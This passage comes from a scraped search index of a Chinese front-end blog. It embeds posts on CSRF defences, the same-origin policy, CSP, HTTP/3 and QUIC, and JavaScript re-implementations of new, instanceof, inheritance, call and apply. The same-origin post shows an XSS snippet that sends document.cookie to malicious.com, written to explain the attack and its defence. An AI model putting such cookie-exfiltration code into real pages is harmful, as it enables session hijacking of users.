&lt;p&gt;由于CSRF攻击 ⼤多来⾃于第三⽅站点，因此服务器可以禁⽌来⾃第三⽅站点的请求。&lt;/p&gt;
&lt;p&gt;HTTP请求头中的 Referer和Origin 属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Referer是HTTP请求头中的⼀个字段，记录了该HTTP请求的来源地址。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;虽然可以通过Referer告诉服务器HTTP请求的来源，但是有⼀些场景是不适合将来源URL暴露给服务器的&lt;/p&gt;
&lt;p&gt;在⼀些重要的 场合，⽐如通过XMLHttpRequest、Fecth发起跨站请求或者通过Post⽅法发送请求时，都会带上Origin属 性&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631186560463.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;Origin属性只包含了域名信息，并没有包含具体的URL路径，这是Origin和Referer的⼀个 主要区别。&lt;/p&gt;
&lt;p&gt;因此，服务器的策略是优先判断Origin，如果请求头中没有包含Origin属性，再根据实际情况判断是否使⽤ Referer值。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;csrf-token&#34;&gt;CSRF Token&lt;/h3&gt;
&lt;p&gt;第⼀步，在浏览器向服务器发起请求时，服务器⽣成⼀个CSRF Token。CSRF Token其实就是服务器⽣成的 字符串，然后将该字符串植⼊到返回的⻚⾯中&lt;/p&gt;
&lt;p&gt;对于浏览器发出的请求都会携带token，第三方页面无法获取token就没办法完成请求&lt;/p&gt;
">跨站脚本攻击（XSS）和CSRF攻击：为什么Cookie中有HttpOnly属性？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tong-yuan-ce-lue-wei-shi-me-xmlhttprequest-bu-neng-kua-yu-qing-qiu-zi-yuan/"" data-c="
          &lt;p&gt;浏览器安全可以分为三⼤块⸺&lt;strong&gt;Web⻚⾯安全、浏览器⽹络安全和浏览器系统安全&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;什么是同源策略&#34;&gt;什么是同源策略&lt;/h2&gt;
&lt;p&gt;如果两个URL的&lt;strong&gt;协议、域名和端⼝&lt;/strong&gt;都相同，我们就称这两个URL同源。&lt;/p&gt;
&lt;p&gt;浏览器默认两个相同的源之间是可以相互访问资源和操作DOM的。两个不同的源之间若想要相互访问资源 或者操作DOM，那么会有⼀套基础的安全策略的制约，我们把这称为同源策略。&lt;/p&gt;
&lt;p&gt;具体来讲，同源策略主要表现在DOM、Web数据和⽹络这三个层⾯。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;第一个dom层面&#34;&gt;第⼀个，DOM层⾯&lt;/h3&gt;
&lt;p&gt;同源策略限制了来⾃不同源的JavaScript脚本对当前DOM对象读和写的操作。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630889177827.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;由于第⼀个⻚⾯和第⼆个⻚⾯是同源关系，所以我们可以在第⼆个⻚⾯中操作第⼀个⻚⾯的DOM，⽐如将 第⼀个⻚⾯全部隐藏掉，代码如下所⽰：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;{
let pdom = opener.document
pdom.body.style.display = &amp;quot;none&amp;quot;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该代码中，对象opener就是指向第⼀个⻚⾯的window对象，我们可以通过操作opener来控制第⼀个⻚⾯ 中的DOM。&lt;/p&gt;
&lt;p&gt;我们在第⼆个⻚⾯的控制台中执⾏上⾯那段代码，就成功地操作了第⼀个⻚⾯中的DOM，将⻚⾯隐藏了&lt;/p&gt;
&lt;p&gt;在不同源的情况就会报跨域错误&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Blocked a frame with origin &amp;quot;https://www.infoq.cn&amp;quot; from accessing a cross-origin frame.&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;第二个数据层面&#34;&gt;第二个，数据层面&lt;/h3&gt;
&lt;p&gt;同源策略&lt;strong&gt;限制了不同源的站点读取当前站点的Cookie、IndexDB、LocalStorage等数据。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当同源的时候，第二个页面也无法通过opener去访问第一个页面的Cookie、indexDB等内容&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;第三个网络层面&#34;&gt;第三个，网络层面&lt;/h3&gt;
&lt;p&gt;同源策略限制了通过XMLHttpRequest等⽅式将站点的数据发送给不同源的站点。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;安全和便利性的权衡&#34;&gt;安全和便利性的权衡&lt;/h2&gt;
&lt;p&gt;同源策略会隔离不同源的DOM、⻚⾯数据和⽹络通信，进⽽实现Web⻚⾯的安全性&lt;/p&gt;
&lt;p&gt;但同时带来了开发的不便和很多安全问题，最典型的是XSS攻击和CSRF攻击&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function onClick(){
let url = `http://malicious.com?cookie = ${document.cookie}`
open(url)
}
onClick()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这段代码中，恶意脚本读取Cookie数据，并将其作为参数添加⾄恶意站点尾部，当打开该恶意⻚⾯时， 恶意服务器就能接收到当前⽤⼾的Cookie信息。&lt;/p&gt;
&lt;p&gt;为了解决XSS攻击，浏览器中引⼊了内容安全策略，称为CSP。&lt;strong&gt;CSP的 核⼼思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执⾏内联JavaScript代码&lt;/strong&gt;。通过这些⼿段就可以⼤⼤减少XSS攻击。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;后来引入&lt;strong&gt;CORS&lt;/strong&gt;（跨域资源请求），使⽤该机制可以进⾏跨域访问控制，从⽽使跨域 数据传输得以安全进⾏&lt;/p&gt;
">同源策略：为什么XMLHttpRequest不能跨域请求资源？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-shi-xian-objectcreateobjectassign/"" data-c="
          &lt;h2 id=&#34;objectcreate&#34;&gt;&lt;code&gt;Object.create()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;可以接受两个参数&lt;/p&gt;
&lt;p&gt;第一个参数是作为创建对象的原型，第二个参数是要创建的对象，默认空对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-&amp;lt;js&#34;&gt;//简略版
function myCreate(obj){
    // 新声明一个函数
    function C(){};
    // 将函数的原型指向obj
    C.prototype = obj;
    // 返回这个函数的实例化对象
    return new C()
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;objectassign&#34;&gt;&lt;code&gt;Object.assign()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Object.assign()用于将对象自身所有的可枚举属性从一个或者多个源对象上复制到目标对象&lt;/p&gt;
&lt;p&gt;不查找原型链&lt;/p&gt;
&lt;p&gt;用&lt;code&gt;for..in&lt;/code&gt;的话就配合&lt;code&gt;hasOwnProperty&lt;/code&gt;用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Object.prototype.myassgin=function(target,...source){
    if(!target){
        throw `${target} is null`
    }
    else{
        var ret=Object(target)

        source.forEach((v,i)=&amp;gt;{
            if(v!==null){
                for( let k in v){
                    if(v.hasOwnProperty(k)){
                        ret[k]=v[k]
                    }
                }
            }
        })

    }

    return ret
}


let a={a:10}
let b={b:2}
let c={c:3}

let d=Object.myassgin(a,b,c)
console.log(d); //{a:10,b:2,c:3}

&lt;/code&gt;&lt;/pre&gt;
">JS实现Object.create、Object.assign</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-shi-xian-newinstanceof-fang-fa/"" data-c="
          &lt;h2 id=&#34;new&#34;&gt;&lt;code&gt;new&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;new&lt;/code&gt;的操作发生了什么呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;new&lt;/code&gt;不过就是让我们从构造函数那里继承它的属性和他的原型属性&lt;/p&gt;
&lt;p&gt;所以实现起来就分几步就好了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建一个空对象，将它的引用赋给 this，继承函数的原型&lt;/li&gt;
&lt;li&gt;通过 this 将属性和方法添加至这个对象&lt;/li&gt;
&lt;li&gt;最后返回 this 指向的新对象，也就是实例（如果没有手动返回其他的对象）&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function mynew(parent,...args){
    if(typeof parent !==&#39;function&#39;)
    throw &#39;it is not function&#39;

    //创建一个parent的空对象 同时把实例和构造函数相连接
    let child =Object.create(parent.prototype)
    
    //修改this指向 完成传参
    let newofn=parent.apply(child,args)

    console.log(newofn);

    //是否返回了函数或者对象 返回了则直接return返回的函数 如果没有返回则手动返回这个构造函数 
    return( typeof newofn===&#39;function&#39;||typeof newofn===&#39;object&#39;)?newofn:child
}   
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//不返回值的情况
function testfn(name=&#39;xixi&#39;){
    this.name=name
    this.age=20
}

//创建实例
let a=mynew(testfn,&#39;myfan&#39;)

console.log(a); //指向testfn 是testfn的实例

console.log(a.name);  //myfan
console.log(a.age);  //20


//需要满足
console.log(a instanceof testfn);  //true
console.log(a.constructor==testfn); //true
console.log(a.__proto__ ==testfn.prototype); //true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实例2&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//返回值的情况
function testfn(name=&#39;xixi&#39;){
    
   return {
       name,
       age:200
   }

}

console.log(a);  //{age: 200 name: &amp;quot;myfan&amp;quot;}
console.log(a.name);  //&amp;quot;myfan&amp;quot;
console.log(a.age);   //200
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;instanceof&#34;&gt;&lt;code&gt;instanceof&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;__proto__&lt;/code&gt;指向构造函数的原型&lt;/p&gt;
&lt;p&gt;思路就是递归，一直到&lt;code&gt;__proto__&lt;/code&gt;为空为结束条件，向上查找是否和构造函数能对上&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function myinstanceof(a,b){
    
    let left=a.__proto__
    let right=b.prototype

    //找到最后都不是返回false
    if(left==null) return false
    //是它的构造函数就返回true
    if(left==right) return true

    //递归查找
    return myinstanceof(left,b)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//实例1
a=new Object()
console.log(myinstanceof(a,Object));  //true

//实例2
function fan(){

}

function xi(){

}

fan.prototype= new xi()

let b=new fan()

console.log(myinstanceof(b,fan)); //true
console.log(myinstanceof(b,xi)); //true
console.log(b instanceof xi );  //true

&lt;/code&gt;&lt;/pre&gt;
">JS实现new、instanceof方法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/http3shuai-diao-tcptls-de-bao-fu-gou-jian-xiao-luo/"" data-c="
          &lt;p&gt;HTTP/2的⼀个核⼼特性是使⽤了多路复⽤技术，因此它可以通过⼀个TCP连接来发送多个URL请求。多路复 ⽤技术能充分利⽤带宽，最⼤限度规避了TCP的慢启动所带来的问题，同时还实现了头部压缩、服务器推送 等功能，使得⻚⾯资源的传输速度得到了⼤幅提升。&lt;/p&gt;
&lt;p&gt;HTTP/3的出现也是为了解决HTTP/2的缺陷&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;tcp的队头阻塞&#34;&gt;TCP的队头阻塞&lt;/h2&gt;
&lt;p&gt;HTTP/2依然是基于TCP协议的，⽽ TCP最初就是为了单连接⽽设计的。&lt;/p&gt;
&lt;p&gt;分析下HTTP/1.1协议栈中TCP是如何传输数据的。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630392741691.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;从⼀端发送给另外⼀端的数据会被拆分为⼀个个按照顺序排列的数据包，这些数据包通 过⽹络传输到了接收端，接收端再按照顺序将这些数据包组合成原始数据，这样就完成了数据传输。&lt;/p&gt;
&lt;p&gt;如果在数据传输的过程中，有⼀个数据因为⽹络故障或者其他原因⽽丢包了，那么整个TCP的连接就 会处于暂停状态，需要等待丢失的数据包被重新传输过来。&lt;/p&gt;
&lt;p&gt;可以把TCP连接看成是⼀个按照顺序传输数据 的管道，管道中的任意⼀个数据丢失了，那之后的数据都需要等待该数据的重新传输。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630392756419.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;我们就把&lt;strong&gt;在TCP传输过程中，由于单个数据包的丢失⽽造成的阻塞称为TCP上的队头阻塞&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;HTTP/2的传输多路请求&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630392616855.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在HTTP/2中，多个请求是跑在⼀个TCP管道中的，如果其中任意⼀路数据流中出现了 丢包的情况，那么就会阻塞该TCP连接中的所有请求。&lt;/p&gt;
&lt;p&gt;这不同于HTTP/1.1，使⽤HTTP/1.1时，浏览器为每 个域名开启了6个TCP连接，如果其中的1个TCP连接发⽣了队头阻塞，那么其他的5个连接依然可以继续传 输数据。&lt;/p&gt;
&lt;p&gt;所以随着丢包率的增加，HTTP/2的传输效率也会越来越差。甚至当丢包率超过一定值时，HTTP/1.1的传输效率反⽽⽐HTTP/2表现得更好。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;tcp建立连接的延时&#34;&gt;TCP建⽴连接的延时&lt;/h2&gt;
&lt;p&gt;TCP的握⼿过程也是影响传输效率的⼀个重要因素。&lt;/p&gt;
&lt;p&gt;⽹络延迟⼜称为RTT（Round Trip Time）。我们把从浏览器发送⼀个数据包到服务器，再从服务 器返回数据包到浏览器的整个往返时间称为RTT。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RTT是反映⽹络性能的⼀个重要指标&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630392611495.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;那建⽴TCP连接时，需要花费多少个RTT呢？&lt;/p&gt;
&lt;p&gt;HTTP/1和HTTP/2都是使⽤TCP协议来传输的，⽽如果使⽤HTTPS的话，还需要使⽤TLS协议进⾏ 安全传输，⽽使⽤TLS也需要⼀个握⼿过程，这样就需要有两个握⼿延迟过程。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在建⽴TCP连接的时候，需要和服务器进⾏三次握⼿来确认连接成功，也就是说需要在消耗完1.5个RTT 之后才能进⾏数据传输。&lt;/li&gt;
&lt;li&gt;进⾏TLS连接，TLS有两个版本⸺TLS1.2和TLS1.3，每个版本建⽴连接所花的时间不同，⼤致是需要1〜 2个RTT&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在传输数据之前，我们需要花掉3〜4个RTT。如果浏览器和服务器的物理距离较近，那么1个RTT的 时间可能在10毫秒以内，也就是说总共要消耗掉30〜40毫秒。这个时间也许⽤⼾还可以接受，但如果服务 器相隔较远，那么1个RTT就可能需要100毫秒以上了，这种情况下整个握⼿过程需要300〜400毫秒，这时 ⽤⼾就能明显地感受到“慢”了。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;tcp协议僵化&#34;&gt;TCP协议僵化&lt;/h2&gt;
&lt;p&gt;现在知道了TCP协议存在&lt;strong&gt;队头阻塞&lt;/strong&gt;和&lt;strong&gt;建⽴连接延迟&lt;/strong&gt;等缺点，那我们是不是可以通过改进TCP协议来解决 这些问题呢？&lt;/p&gt;
&lt;p&gt;答案是：⾮常困难。之所以这样，主要有两个原因。&lt;/p&gt;
&lt;p&gt;第⼀个是&lt;strong&gt;中间设备的僵化&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;互联⽹是由多个⽹络互联的⽹状结构，为了能够保障互联⽹的正常⼯作，我们需要在互联⽹的各处搭建各种设 备，这些设备就被称为中间设备。&lt;/p&gt;
&lt;p&gt;这些中间设备有很多种类型，并且每种设备都有⾃⼰的⽬的，这些设备包括了路由器、防⽕墙、NAT、交换 机等。它们通常依赖⼀些很少升级的软件，这些软件使⽤了⼤量的TCP特性，这些功能被设置之后就很少更 新了。&lt;/p&gt;
&lt;p&gt;所以，如果我们在客⼾端升级了TCP协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包 的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍TCP更新的⼀⼤障碍。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;操作系统也是导致TCP协议僵化的另外⼀个原因&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;因为TCP协议都是通过操作系统内 核来实现的，应⽤程序只能使⽤不能修改。通常操作系统的更新都滞后于软件的更新，因此要想⾃由地更新 内核中的TCP协议也是⾮常困难的。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;quic协议&#34;&gt;QUIC协议&lt;/h2&gt;
&lt;p&gt;HTTP/2存在⼀些⽐较严重的与TCP协议相关的缺陷，但由于TCP协议僵化，我们⼏乎不可能通过修改TCP协 议⾃⾝来解决这些问题，那么解决问题的思路是绕过TCP协议，发明⼀个TCP和UDP之外的新的传输协议。&lt;/p&gt;
&lt;p&gt;但是这也⾯临着和修改TCP⼀样的挑战，因为中间设备的僵化，这些设备只认TCP和UDP，如果采⽤了新的 协议，新协议在这些设备同样不被很好地⽀持。&lt;/p&gt;
&lt;p&gt;因此，HTTP/3选择了⼀个折衷的⽅法⸺UDP协议，基于UDP实现了类似于 TCP的多路数据流、传输可靠性等功能，我们把这套功能称为&lt;strong&gt;QUIC协议&lt;/strong&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630392604532.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;p&gt;通过上图我们可以看出，HTTP/3中的QUIC协议集合了以下⼏点功能。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;实现了类似TCP的流量控制、传输可靠性的功能&lt;/strong&gt;。虽然UDP不提供可靠性的传输，但QUIC在UDP的基础 之上增加了⼀层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他⼀些TCP中存在的特 性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;集成了TLS加密功能&lt;/strong&gt;。 ⽬前QUIC使⽤的是TLS1.3，相较于早期版本TLS1.3有更多的优点，其中最重要的 ⼀点是减少了握⼿所花费的RTT个数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实现了HTTP/2中的多路复⽤功能&lt;/strong&gt;。和TCP不同，QUIC实现了在同⼀物理连接上可以有多个独⽴的逻辑数 据流（如下图）。实现了数据流的单独传输，就解决了TCP中队头阻塞的问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630392599144.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;实现了快速握⼿功能&lt;/strong&gt;。由于QUIC是基于UDP的，所以QUIC可以实现使⽤0-RTT或者1-RTT来建⽴连接， 这意味着QUIC可以⽤最快的速度来发送和接收数据，这样可以⼤⼤提升⾸次打开⻚⾯的速度。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;http3的挑战&#34;&gt;HTTP/3的挑战&lt;/h2&gt;
&lt;p&gt;挑战主要来⾃于以下三个⽅⾯&lt;/p&gt;
&lt;p&gt;第⼀，从⽬前的情况来看，服务器和浏览器端都没有对HTTP/3提供⽐较完整的⽀持。&lt;/p&gt;
&lt;p&gt;第⼆，部署HTTP/3也存在着⾮常⼤的问题。因为系统内核对UDP的优化远远没有达到TCP的优化程度，这 也是阻碍QUIC的⼀个重要原因。&lt;/p&gt;
&lt;p&gt;第三，中间设备僵化的问题。这些设备对UDP的优化程度远远低于TCP，据统计使⽤QUIC协议时，⼤约有 3%〜7%的丢包率。&lt;/p&gt;
">HTTP3：甩掉TCP、TLS的包袱，构建⾼效⽹络</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-zhong-shi-xian-ji-cheng/"" data-c="
          &lt;h2 id=&#34;原型链继承&#34;&gt;原型链继承&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;SubType.prototype = new SuperType();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注意点&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//使用字面量添加新方法，会导致上一行代码无效
SubType.prototype = { 
 getSubValue : function (){ 
     return this.subproperty; 
 }, 
 someOtherMethod : function (){ 
     return false; 
 } 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;单纯使用原型链继承会存在引用数据共用的问题。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;借用构造函数继承&#34;&gt;借用构造函数继承&lt;/h2&gt;
&lt;p&gt;基础&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-jss&#34;&gt;function SubType(){ 
 //继承了 SuperType 
 SuperType.call(this); 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以实现传参&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function SubType(name,age){ 
 //继承了 SuperType，同时还传递了参数
 SuperType.call(this, age); 
 //实例属性
 this.age = age; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;存在的问题是&lt;strong&gt;方法都在构造函数里面定义，而无法继承到SubType里面的方法&lt;/strong&gt;，淡化了函数复用概念&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;组合继承&#34;&gt;组合继承&lt;/h2&gt;
&lt;p&gt;组合原型链和借用构造继承&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function SubType(name, age){ 
 //继承属性
 SuperType.call(this, name); 
 
 this.age = age; 
} 

//继承方法
SubType.prototype = new SuperType(); 
//弥补因重写原型而失去的默认的 constructor 属性
SubType.prototype.constructor = SubType; 
//实现在原型链增加共用函数 达到函数复用
SubType.prototype.sayAge = function(){ 
 alert(this.age); 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这属于很常用的继承模式&lt;/p&gt;
&lt;h2 id=&#34;原型式继承&#34;&gt;原型式继承&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function myobject(o){ 
 function F(){} 
 F.prototype = o; 
 return new F(); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者使用ES6中的&lt;code&gt;Object.create()&lt;/code&gt;可以实现一样的效果&lt;/p&gt;
&lt;p&gt;实际上就是创建了一个临时性的构造函数，然后将传入的对象作为这个构造函数的 原型，最后返回了这个临时类型的一个新实例。&lt;/p&gt;
&lt;p&gt;当然这样实现的都是浅拷贝，副本对于原函数的引用类型一样是共享的。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;寄生继承&#34;&gt;寄生继承&lt;/h2&gt;
&lt;p&gt;寄生式（parasitic）继承是与原型式继承紧密相关的一种思路&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function createAnother(original){ 
     var clone = object(original); //通过调用函数创建一个新对象
    
     clone.sayHi = function(){ //以某种方式来增强这个对象
     alert(&amp;quot;hi&amp;quot;); 
     }; 
     return clone; //返回这个对象
} 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其实就是多个给构造函数加东西的过程，也没有实现函数的复用。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;寄生组合继承&#34;&gt;寄生组合继承&lt;/h2&gt;
&lt;p&gt;对于组合继承不够优秀的补充，组合继承调用了两次超类型构造函数，存在属性覆盖的情况。&lt;/p&gt;
&lt;p&gt;基本思路是：不必为了指定子类型的原型而调用超类型的构造函数，我们所需要的无非就是超类型 原型的一个副本而已。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function inheritPrototype(subType, superType){ 
     var prototype = object(superType.prototype); //创建对象
     prototype.constructor = subType; //增强对象
     subType.prototype = prototype; //指定对象
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;高效率体现在它只调用了一次 SuperType 构造函数，并且因此避免了在 SubType.  prototype 上面创建不必要的、多余的属性。&lt;/p&gt;
&lt;p&gt;实例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//寄生组合继承

//超构造函数
function person(name=&#39;我是默认姓名&#39;){
    this.name=name
    this.color=[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]
}
person.prototype.getcolor=function(){

    return this.color
}

//构造函数
function people (age,name){
    //继承属性 
    person.call(this,name)

    this.age=age
}

//实现部分
people.prototype=Object.create(person.prototype)
//弥补因重写原型而失去的默认的 constructor 属性
people.prototype.constructor=people

person.prototype.addcolor=function(arr){
    
    this.color.push(...arr)
}

//实例
var fan1=new people(&#39;19&#39;,&#39;fanfan&#39;)

var fan2=new people(&#39;20&#39;,&#39;xixi&#39;)

fan1.addcolor([&#39;add1&#39;,&#39;add2&#39;])

console.log(fan1.getcolor());  //&amp;quot;1&amp;quot;, &amp;quot;2&amp;quot;, &amp;quot;3&amp;quot;, &amp;quot;add1&amp;quot;, &amp;quot;add2&amp;quot;
console.log(fan2.getcolor());  //&amp;quot;1&amp;quot;, &amp;quot;2&amp;quot;, &amp;quot;3&amp;quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;es6的继承&#34;&gt;ES6的继承&lt;/h2&gt;
&lt;p&gt;class注意点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;class相当于es5中的构造函数&lt;/li&gt;
&lt;li&gt;class定义方法时候，不能加function，方法也是定义在class的原型链上。&lt;/li&gt;
&lt;li&gt;class定义的方法都是不可枚举的。&lt;/li&gt;
&lt;li&gt;class只能定义方法，不用定义对象，变量&lt;/li&gt;
&lt;li&gt;class默认严格模式，全局this指向undefined&lt;/li&gt;
&lt;li&gt;es5中的constructor为隐式属性&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;class person{
    constructor(name=&#39;fanfan&#39;,age){
        this.name=name
        this.age=age
        this.color=[1.2,3]
       
    }

    getmyname(){
        //调用this依旧指向子类
        console.log(this.name);
        return this.color
    }

}

//继承
class people extends person{
    constructor(name=&#39;xixi&#39;,age){
      super(name,age)
      this.name=name
    }

    getname(){
        return super.getmyname()
    }
}

var fan1=new people(&#39;??&#39;,&#39;200&#39;)

console.log(fan1.getname()); //??  [1.2, 3]
&lt;/code&gt;&lt;/pre&gt;
">JS中实现继承</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/callapplybind-shou-xie-shi-xian/"" data-c="
          &lt;h2 id=&#34;call的实现&#34;&gt;call的实现&lt;/h2&gt;
&lt;p&gt;call的第一个参数是指向值，如果为null或者undefined则是，this指向window&lt;/p&gt;
&lt;p&gt;第二个参数是以一个一个传入&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Function.prototype.fancall=function(context,...arg){
    //如果是null和undefined的时候就指向全局
    if(context==null||context==undefined)
    context=window

    let tem=Symbol()  //做一个唯一值 防止于原上下文对象属性冲突
    context[tem]=this //函数隐试绑定到context上 
    let res = context[tem](...arg) //传参执行  就是function() 执行
    delete context[tem]  //删除临时属性
    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;apply实现&#34;&gt;apply实现&lt;/h2&gt;
&lt;p&gt;唯一不同就是传参方式不同&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Function.prototype.fanapply=function(context){
    //如果是null和undefined的时候就指向全局
    if(context==null||context==undefined)
    context=window

    let arr=arguments[1] //获取数组参数 就是第二个
    console.log(arr);
    let tem=Symbol()  //做一个唯一值 防止于原上下文对象属性冲突
    context[tem]=this //函数隐试绑定到context上 
    let res

    if(arr){
         res = context[tem](arr) //传参执行  就是function() 执行
    }
    else{
         res = context[tem]() //传参执行  就是function() 执行
    }
    
    delete context[tem]  //删除临时属性
    return res
}
